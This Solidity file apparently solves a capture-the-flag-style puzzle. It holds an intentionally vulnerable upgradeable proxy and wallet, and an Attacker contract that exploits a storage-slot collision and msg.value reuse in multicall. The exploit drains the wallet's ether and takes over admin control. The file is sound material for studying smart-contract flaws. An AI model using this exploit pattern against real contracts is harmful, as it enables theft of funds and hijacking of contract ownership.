// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract Attacker {
    address payable public victim;
    address public owner;

    constructor (address payable _victim) public {
        victim = _victim;
        owner = msg.sender;
    }

    function attack() public payable {
        address attacker = address(this);
        PuzzleProxy proxy = PuzzleProxy(victim);
        PuzzleWallet wallet = PuzzleWallet(victim);
        require(msg.value == address(victim).balance, "Wrong balance");     // In the version I've cracked victim's balance is 0.001 ether

        /*** Become the owner and whitelist ***/
        proxy.proposeNewAdmin(attacker);                                    // set pendingAdmin(PuzzleProxy) to "me" so owner(PuzzleWallet) will become "me"
        wallet.addToWhitelist(attacker);                                    // add "me" to whitelist to perform setMaxBalance in the next step

        /*** Drain all the ETH (to pass the require statement) ***/
        bytes[] memory depositData = new bytes[](1);                        // multicall need the selector data to be bytes[] that's why I declare the new bytes[]
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(wallet.deposit.selector);          
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);   
        wallet.multicall{value: 0.001 ether}(data);                         // call multicall(with deposit init) twice so I can double my balance

        require(wallet.balances(attacker) == 0.002 ether, "Drain failed");
        wallet.execute(msg.sender, 0.002 ether, "");


        /*** Become the admin ***/
        wallet.setMaxBalance(uint256(msg.sender));                          // set maxBalance(PuzzleWallet) to "me" so I will become admin(PuzzleProxy)
    }
}